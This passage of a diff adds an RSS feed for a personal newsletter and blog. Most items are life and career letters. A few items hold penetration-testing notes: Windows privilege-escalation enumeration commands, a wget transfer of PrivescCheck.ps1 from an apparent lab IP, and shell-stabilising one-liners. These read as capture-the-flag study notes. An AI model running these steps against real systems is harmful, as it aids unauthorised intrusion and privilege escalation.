+      <guid>//localhost:1313/in-progress/</guid>
+      <description>How was your week? I hope it was the right mix between challenging and fun!
+I&amp;rsquo;d like to share with you someone I found while scrolling through Twitter.
+It all started with “I&amp;rsquo;d like to try something new…”
+That was enough to get my attention.
+As of writing this letter, it was a couple of weeks ago now. Wow time moves fast.
+Share your work in progress Let me introduce you to Marc, he&amp;rsquo;s from the Netherlands.</description>
+    </item>
+    
+    <item>
+      <title>It&#39;s me again</title>
+      <link>//localhost:1313/its-me-again/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/its-me-again/</guid>
+      <description>Hello friend,
+Annnnnd the aware for the longest break of a weekly newsletter goes too… me.
+Yes, it’s been a while, but I hope you’ve been well. Let’s go!
+NetworkChuck’s Been On My Website! NetworkChuck recent [https://youtu.be/gwUz3E9AW0w](you need a website) video has my website in the description! So cool!
+Like he says, “Why don’t you have a website? I think EVERYONE needs a website, especially if you are trying to get a job in information technology!</description>
+    </item>
+    
+    <item>
+      <title>Lazy n Lost</title>
+      <link>//localhost:1313/lazy-n-lost/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/lazy-n-lost/</guid>
+      <description>Hi friend,
+We made it through April, I hope you’ve had a good month and you’re doing well. Warning, this letter is self-indulgent so if that’s not your thing, I understand, you can read the blog posts under Months Memories below.
+Let’s chat, I was really lazy this month, honestly, I had a tough week or two throughout April, my brain spiralled leaving me pretty lost. So I thought it’d be beneficial to explore the habit of laziness and how it impacts me and probably you too.</description>
+    </item>
+    
+    <item>
+      <title>Learn Cyber</title>
+      <link>//localhost:1313/learn-cyber/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/learn-cyber/</guid>
+      <description>Let&amp;rsquo;s look back at the last 31 days, discuss the best way to learn cyber security and I’ll share a new project I’m working on. Disclaimer, you’ve received this newsletter as you subscribed to Mr Ash .co.
+the BEST way to learn CyberSec?! If you want into CyberSec then get into Capture The Flags (CTFs), simple. CTFs are gamified learning, I mean, why do people spend so many hours playing video games?</description>
+    </item>
+    
+    <item>
+      <title>Let&#39;s Write</title>
+      <link>//localhost:1313/lets-write/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/lets-write/</guid>
+      <description>Hi friend,
+I hope your November has been well, question, do you write a lot? Generally, most people write or type daily as it&amp;rsquo;s fundamental to their job or life. It&amp;rsquo;s also the basis of how computer programs are made so it&amp;rsquo;s sort of what the entire tech world is built on. Writing is how we share information, how we teach and provide knowledge. Let&amp;rsquo;s see how writing independently can improve our lives.</description>
+    </item>
+    
+    <item>
+      <title>Looking Inward</title>
+      <link>//localhost:1313/looking-inward/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/looking-inward/</guid>
+      <description>Hello friend,
+How has your week been? Reply amd tell me.
+My week feels long. Not sure why. It’s been full of family gatherings and time spent with those closest. I hope it’s been the same for you. This issue is focused on looking inward. I’ve found the more we discover ourselves, the better we can contribute to others.
+1. Sit Down and Think We get bombarded with notifications. Social media and our devices stop us from being intentional.</description>
+    </item>
+    
+    <item>
+      <title>Measuring Success</title>
+      <link>//localhost:1313/measuring-success/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/measuring-success/</guid>
+      <description>Hello friend,
+Can you believe it&amp;rsquo;s the end of 2020?
+I hope you&amp;rsquo;ve had a good week since we last spoke, for me, it&amp;rsquo;s been really nice as it&amp;rsquo;s the second week left of work for the year! Woo-hoo! Very excited for the holidays.
+My wife and I, with a few friends, managed to take a short trip to Rainbow Beach for a few days. If you&amp;rsquo;re ever in Queensland, make sure to visit the sand dunes called the “Blow Hole”, it&amp;rsquo;s incredible.</description>
+    </item>
+    
+    <item>
+      <title>Network Services 2 TryHackMe Part 1 NFS</title>
+      <link>//localhost:1313/thm-nfs-1/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/thm-nfs-1/</guid>
+      <description>Hello, welcome back.
+We are doing some more Trihack me
+walkthroughs and it’s goingto be Network services too.
+Put my phone on silent orat least turn it down.
+Today we’re going to be doing this roomand it reads enumerating and exploiting
+the more common networkservices and misconfigs.
+If you want to catch Network services one
+there will be a card popping up or a linkdescription in the description or</description>
+    </item>
+    
+    <item>
+      <title>Oh, Shiny</title>
+      <link>//localhost:1313/oh-shiny/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/oh-shiny/</guid>
+      <description>Hey friend,
+September&amp;rsquo;s come and gone! This month&amp;rsquo;s felt long as term 3 wrapped up, lots has happened and now it&amp;rsquo;s the last term for 2021. Let&amp;rsquo;s look over some highlights for the month.
+Disclaimer, you&amp;rsquo;re receiving this newsletter as you subscribed to or downloaded from mrash.co. If you&amp;rsquo;d like to unsubscribe, see below, also, here&amp;rsquo;s last month&amp;rsquo;s newsletter.
+Why I Do&amp;hellip; What I Do If you didn&amp;rsquo;t know, I&amp;rsquo;m an I.</description>
+    </item>
+    
+    <item>
+      <title>PowerShell</title>
+      <link>//localhost:1313/powershell/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/powershell/</guid>
+      <description>whoami /priv whoami /all gci -recurse . gci -recurse -hidden . Manual Enum - C:\Users - C:\ - C:\Windows\Temp Auto Enum - Winpeas - PrivesCheck (https://github.com/itm4n/PrivescCheck) - . .\PrivescCheck.ps1; Invoke-PrivescCheck Transfer - wget http://$ip/ -UseBasicParsing -OutFile $file.ext wget http://10.4.59.208:8000/PrivescCheck.ps1 -UseBasicParsing -OutFile PrivescCheck.ps1``` --- Thanks for reading </description>
+    </item>
+    
+    <item>
+      <title>Put Yourself Out</title>
+      <link>//localhost:1313/put-yourself-out/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/put-yourself-out/</guid>
+      <description>Hi friend,
+Hope you’re safe and well during the last 28(ish) days since I wrote to you. It’s so sad to see countries on the brink of war in the modern era, hoping peace comes soon for everything going on.
+On a lighter note, let’s discuss ‘putting yourself out there’ - no this isn’t dating advice, but more life/work observations. I’ve found benefits from writing on the internet, sharing lessons and helping others, but it takes effort.</description>
+    </item>
+    
+    <item>
+      <title>Relax Do It</title>
+      <link>//localhost:1313/relax-do-it/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/relax-do-it/</guid>
+      <description>Hello friend,
+How’s your week been?
+Professionally, it’s a good one for me. I’ve been back into work by setting up students for their course.
+Personally, I’ve been slightly neglecting my morning routine and slipping on positive habits. I think getting back into work is draining me more than I was expecting. I need to find a new balance being back in work mode.
+As always, aligning myself with my 2020 yearly review I’m writing to you.</description>
+    </item>
+    
+    <item>
+      <title>Rustscan</title>
+      <link>//localhost:1313/rustscan/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/rustscan/</guid>
+      <description>Installing Docker.
+Bash script:
+#!/bin/bash # Update, install and enable Docker sudo apt update -y &amp;amp;&amp;amp; sudo apt upgrade -y sudo apt install -y docker.io sudo systemctl enable docker --now # Add current use into docker group sudo usermod -aG docker $USER # Pull latest Rustscan docker pull rustscan/rustscan:latest # Create a ZSH Aliases File touch ~/.zsh_aliases # Add it to ZSH RC echo &amp;#34;&amp;#34;&amp;#34;if [ -f ~/.zsh_aliases ]; then .</description>
+    </item>
+    
+    <item>
+      <title>Scammed</title>
+      <link>//localhost:1313/scammed/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/scammed/</guid>
+      <description>Hi friend,
+Another four weeks have come and gone, it’s mindboggling to see war expand and produce the largest cyberwar in history. With cybercrime on the up globally, it’s hitting here home in Australia, hear how scammers are taking over Instagram accounts.
+Disclaimer, you’ve received this newsletter as you’re subscribed to Mr Ash.co (or downloaded a freebie)/ If interested, read last month’s or see all newsletters, thanks for reading.
+Staying Safe Online Over the past few weeks, two friends of mine had their Instagram accounts taken over by a scammer.</description>
+    </item>
+    
+    <item>
+      <title>Shells</title>
+      <link>//localhost:1313/shells/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/shells/</guid>
+      <description>python -c &amp;#34;import pty; pty.spawn(&amp;#39;/bin/bash&amp;#39;)&amp;#34; python3 -c &amp;#34;import pty; pty.spawn(&amp;#39;/bin/bash&amp;#39;)&amp;#34; /bin/sh -i [CTRL+Z] stty raw -ech;fg export TERM=xterm Thanks for reading</description>
+    </item>
+    
+    <item>
+      <title>Staying Creative and Connected</title>
+      <link>//localhost:1313/staying-creative-and-connected/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/staying-creative-and-connected/</guid>
+      <description>Hello friend,
+It&amp;rsquo;s been a while.
+You&amp;rsquo;re receiving this because you&amp;rsquo;re on my email list, if you don&amp;rsquo;t remember signing up, hi 👋
+I&amp;rsquo;d like to apologise if you subscribed and read ‘weekly&amp;rsquo; newsletter, this has hardly been weekly. There are a few area&amp;rsquo;s I struggle to commit too, writing weekly is one. I&amp;rsquo;m very committed to changing this.
+I hope you&amp;rsquo;ve been well since I last wrote, it feels like a lifetime since we&amp;rsquo;ve done this.</description>
+    </item>
+    
+    <item>
+      <title>Todo, Writing. Check!</title>
+      <link>//localhost:1313/todo-writing-check/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/todo-writing-check/</guid>
+      <description>Hello friend,
+How has your week been? I&amp;rsquo;ve got a lot to share with you!
+This week has been massive! Writing short-course, ordering my life todo list and becoming certified from Google! Read on to find out how.
+1. Writing Well by Julian Shapiro If you write well, you think well. Stop reading this and go to this guide. If you&amp;rsquo;re still here, why? Spend your next 3-4 hours reading, taking notes and having your mind blown.</description>
+    </item>
+    
+    <item>
+      <title>You Dream&#39;n</title>
+      <link>//localhost:1313/you-dreamn/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/you-dreamn/</guid>
+      <description>Hey friend,
+Can you believe it&amp;rsquo;s the end of another month? Four weeks can go so fast! October&amp;rsquo;s been about goals, dreams, and the power of compounding habits to achieve them.
+Compound, claimed to be the eighth wonder of the world (it is for investing), but what is it? Put simply, compound is the long term effects of small steps. For example, going to the gym once every couple of days shows little result, but that habit compounded over years returns massive gains.</description>
+    </item>
+    
+  </channel>
+</rss>
